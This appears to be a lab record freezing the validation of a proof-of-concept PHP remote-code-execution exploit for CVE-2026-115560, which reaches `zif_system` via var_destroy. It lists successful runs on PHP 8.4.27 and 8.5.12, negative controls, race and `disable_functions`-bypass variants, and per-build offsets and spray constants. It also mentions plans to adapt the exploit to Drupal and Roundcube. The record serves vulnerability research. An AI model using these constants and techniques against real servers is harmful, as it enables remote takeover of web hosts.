# Phase 0 freeze — CVE-2026-115560 → var_destroy → `zif_system`

**Date:** 2026-10-31  
**Status:** G0 **PASS** — four positives and all listed controls reproduced on the
current tree. This file freezes the driver versions, constants, and evidence
before the Phase 1/2 real-app work.

**Scope:** LAB-ONLY. Targets `127.0.0.1`, fixed benign command
`id>/tmp/vd 2>&1`. Published 2026-10-31; see
`docs/RESPONSIBLE_PUBLICATION.md`.

## Frozen build

| item | value |
|---|---|
| git HEAD | `ed1181edc1ec0d57166e815c3f53bab92b0d95ee` |
| `poc/verify_115560_vardestroy.py` | `692d328072435235057b2daca0d60a467a0d3edd1c4b4c4e73f221f3ee3f91c2` |
| `poc/verify_115560_race.py` | `4e8164627310eb025ce816c6d16b5298de227da5e1c5eda3880889a4d2c82aa3` |
| `lab-115560/webroot/index.php` | `c7ad767e19ab176d24d1b24b3bceda17b3b7b7bf4b544a4e743311146c6c3258` |
| `lab-115560/php-115560.ini` | `997f9bd386bc3d5cd05b097cec42496b077bfa937743e06c9d3fd807b120c6bd` |
| Python | 3.14.7 |
| Docker | 29.8.2 |

## Positives

| build | target | mode | result |
|---|---|---|---|
| 8.4.27 | `127.0.0.1:18200` / `php2shell-115560-8427` | direct `run` | `main=0xffff9e400000 lib=0xffffa0530000 zif=0xffffa0961510 delta=0x6c019` → `uid=33(www-data)` |
| 8.5.12 | `127.0.0.1:18201` / `php2shell-115560-8512` | direct `run` | `main=0xffffa3c00000 lib=0xffffa0600000 zif=0xffffa0b35490 delta=0x6c019` → `uid=33(www-data)` |
| 8.4.27 | `127.0.0.1:18203` / `php2shell-115560-8427-nofunc` | `run` (`disable_functions` set) | `main=0xffff87a00000 zif=0xffff89fc1510 delta=0x6c019` → `uid=33(www-data)` |
| 8.4.27 | `127.0.0.1:18204` / `php2shell-115560-8427-race` | `cleanup=On`, `--settle 0.7 --attempts 3 run` | `delta=0x6d875` → `uid=33(www-data)`; dtor log `inv=1 skip-first` / `inv=2 spray-done ref=1020 fire-end` |
| 8.5.12 | `127.0.0.1:18205` / `php2shell-115560-8512-race` | `cleanup=On`, `--settle 0.7 --attempts 3 run` | `delta=0x80875` → `uid=33(www-data)`; same dtor shape |

## Controls (all negative)

| control | command / target | observed |
|---|---|---|
| wrong `zif` (direct) | 8.4.27 `--bias-zif 0x1000 run` | measure OK, `proof=''` |
| no runtime handler switch | 8.4.27 `--path /noswitch.php run` | HTTP 200, no `meas_pid`, `proof=''` |
| upload-progress off | `127.0.0.1:18202` / `php2shell-115560-8427-noupload run` | no dtor, no `meas_pid` |
| race past window | 8.4.27 race `--settle 6.0 --attempts 1 --no-remeasure run` | only `inv=1 skip-first`; no real dtor, no proof |
| race no persistent first record | 8.4.27 race `--no-seed --measure-attempts 1 --no-remeasure run` | only `inv=1`; no real dtor, no proof |
| race wrong `zif` | 8.5.12 race `--bias-zif 0x1000 --attempts 1 --no-remeasure run` | real dtor reached, `proof=''` (a rerun with re-measure re-derived the un-biased zif; the clean control is `--no-remeasure`) |
| race other SID | upload SID `bd55…` to `/prime.php`, consumer SID `ea6f…` to `/index.php?m=5` | `dtor_log='after-session-start\nshutdown\n'`, no `meas_pid`, HTTP 200 |

## Frozen calibration constants (this request shape)

| build | delta (direct) | delta (race) | `lib − main` | `zif_system` | spray |
|---|---|---|---|---|---|
| 8.4.27 | `0x6c019` | `0x6d875` | `+0x2130000` | `0x431510` | `3048` |
| 8.5.12 | `0x6c019` | `0x80875` | `-0x3600000` | `0x535490` | `8135` |

Reference id `1020`; fresh SID per request/attempt; `save_path=/tmp/sessions`.

## Note for Phase 1/2

The driver constants are **per request shape**. A different app/consumer page
(Drupal, Roundcube) must re-measure `delta`, and `libphp`/`zif_system` must be
resolved for that container. Only the payload/carrier geometry is frozen.
